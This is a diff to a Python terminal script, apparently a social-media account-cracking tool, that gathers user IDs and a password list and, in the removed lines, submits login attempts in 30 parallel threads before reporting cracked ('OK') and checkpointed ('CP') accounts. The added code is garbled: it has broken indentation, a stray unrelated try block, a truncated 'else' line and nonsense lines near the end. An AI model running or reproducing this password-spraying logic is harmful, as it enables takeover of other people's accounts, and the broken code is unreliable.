@@ -417,49 +417,19 @@ def menu():
                        ps_limit =1
                 clear() 
                 print(' \033[1;32m[\033[1;31m–\033[1;32m] EXAMPLE : first last,firtslast,first123')
-                dino()
-                for i in range(ps_limit): 
-                    plist.append(input(f' \033[1;32m[\033[1;31m–\033[1;32m] PASSWORD {i+1}:\033[1;31m '))
-                clear()
-                print(' \033[1;32m[\033[1;31m–\033[1;32m] DO YOU WENT SHOW CP ACCOUNT ? [Y/N] : ')
-                dino()
-                cx=input(' \033[1;32m[\033[1;31m–\033[1;32m] CHOOSE : ')
-                if cx in ['y','Y','yes','Yes','1']:
-                    pcp.append('y')
-					
-try:
-    ids, names = user.split('|')
-except ValueError:
-    print("خطأ: يجب أن تكون القيمة بالشكل id|name")
-                    pcp.append('n')
-                with tred(max_workers=30) as crack_submit:
-                    clear()
-                    total_ids = str(len(fo))
-                    print(" \033[1;32m[\033[1;31m–\033[1;32m] IF NO RESULT \033[1;33m[\033[1;31mON\033[1;33m/\033[1;31mOFF\033[1;33m] \033[1;32mAIRPLAN MODE ")
-                    print(' \033[1;32m[\033[1;31m–\033[1;32m] SIM NAME   \033[1;33m: \033[1;37m'+carrier+f' ')
-                    print(' \033[1;32m[\033[1;31m–\033[1;32m] TOTAL UID  \033[1;33m| \033[1;32mMETHOD \033[1;33m: \033[1;37m'+total_ids+f'\033[1;33m >> \033[1;37mM'+mthd+f' ')
-                    linex()
-					
-                        
-                            if mthd in ['1','01']:
-                                    crack_submit.submit(M_file_1,ids,names,passlist) 
-                            elif mthd in ['2','02']:
-                                    crack_submit.submit(M_file_2,ids,names,passlist)
-                            elif mthd in ['3','03']:
-                                    crack_submit.submit(M_file_3,ids,names,passlist)
-                            elif mthd in ['4','04']:
-                                    crack_submit.submit(M_file_4,ids,names,passlist)
-                            elif mthd in ['5','05']:
-                                     crack_submit.submit(M_file_5,ids,names,passlist)
-                            elif mthd in ['6','06']:
-                                      crack_submit.submit(M_file_6,ids,names,passlist)
-                            elif mthd in ['7','07']:
-                                      crack_submit.submit(M_file_7,ids,names,passlist)
-                dino()
-                print('\033[1;32m[\033[1;31m–\033[1;32m] Behind every hackers smile...a victims tear! ')
-                print('\033[1;32m[\033[1;31m–\033[1;32m] The process has completed ')
-                print('\033[1;32m[\033[1;31m–\033[1;32m] OK/CP : '+str(len(oks))+'/'+str(len(cps)))
-                dino()
+          dino()
+for i in range(ps_limit): 
+    plist.append(input(f' \033[1;32m[\033[1;31m–\033[1;32m] PASSWORD {i+1}:\033[1;31m '))
+
+clear()
+print(' \033[1;32m[\033[1;31m–\033[1;32m] DO YOU WENT SHOW CP ACCOUNT ? [Y/N] : ')
+dino()
+cx = input(' \033[1;32m[\033[1;31m–\033[1;32m] CHOOSE : ')
+
+if cx in ['y','Y','yes','Yes','1']:
+    pcp.append('y')
+else:
+    p      
                 input(' Press enter to back ')
                 os.system('python DJALIL_MK.py') 
             elif xd in ['0','00']:
@@ -933,6 +903,7 @@ raise KeyError ("XD")
 "HaN".FuCk
 raise SystemExit
 open('').close()
+
 
 
 
